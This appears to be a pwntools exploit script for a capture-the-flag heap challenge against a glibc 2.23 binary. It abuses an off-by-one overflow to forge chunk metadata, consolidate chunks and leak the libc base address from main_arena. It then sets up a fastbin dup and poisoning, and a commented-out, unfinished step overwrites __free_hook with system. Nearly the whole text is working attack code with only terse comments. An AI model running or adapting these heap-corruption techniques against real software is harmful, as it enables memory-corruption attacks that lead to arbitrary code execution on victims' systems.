from pwn import *
#elf = ELF('./babyheap', checksec=False)
elf = ELF('./heap_61ceffec55b07104a008e18cca5df4a00ed8fad755c46cf4256eff3ba2ca18f3', checksec=False)
libc = ELF('/opt/glibc/x64/2.23/lib/libc-2.23.so', checksec=False)
#libc = ELF('./libc6_2.23-0ubuntu10_amd64.so', checksec=False)

def malloc(sz, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', b'%d' % sz)
    p.sendafter(b': ', b'%s' % data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', b'%d' % idx)

def leak(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', b'%d' % idx)
    return p.recvline_contains(b'data').decode('latin-1').strip().split(' ')[-1]

#p = remote('35.186.153.116', 7001)
p = elf.process()


malloc(0xf8, b'A'*0xf8) # chunk_AAA, idx = 0
malloc(0x68, b'B'*0x68) # chunk_BBB, idx = 1
malloc(0xf8, b'C'*0xf8) # chunk_CCC, idx = 2
malloc(0x10, b'D'*0x10) # chunk_DDD, idx = 3

free(0)

# leverage off-by-one vuln in chunk_BBB:
# overwrite prev_inuse bit of following chunk (chunk_CCC)
free(1)
malloc(0x68, b'B'*0x68) # chunk_BBB, new idx = 0

# set prev_size of following chunk (chunk_CCC) to 0x170
for i in range(0x66, 0x5f, -1):
  free(0)
  malloc(i+2, b'B'*i + b'\x70\x01') # chunk_BBB, new_idx = 0

# consolidate chunk C with B
free(2)

# create a new chunk (chunk_EEE) within the big free chunk to push
# the libc-addresses (fd/bk) down to chunk_BBB
malloc(0xf6, b'E'*0xf6) # chunk_EEE, new_idx = 1

# - 0x3c4b78
libc.address = u64(leak(0).encode('latin-1').ljust(8, b'\x00')) - (libc.sym['main_arena']+88)
log.info('libc base 0x%x' % libc.address)

malloc(0x18, b'Q'*0x8) # 2
malloc(0x18, b'E'*0x8) # 4

# fastbin dup
free(0) # 0x21
free(3) # 0x21
free(2) # 0x21

malloc(0x128, b'X'*0x120) # 2
free(0)
free(1)
# fastbin poisoning


#malloc(0x18, p64(libc.sym['__free_hook'])) 
#malloc(0x18, b)
#malloc(0x18, p64(libc.sym['system']) + b'\x00'.ljust(0x18-8-1, b'A'))

p.interactive()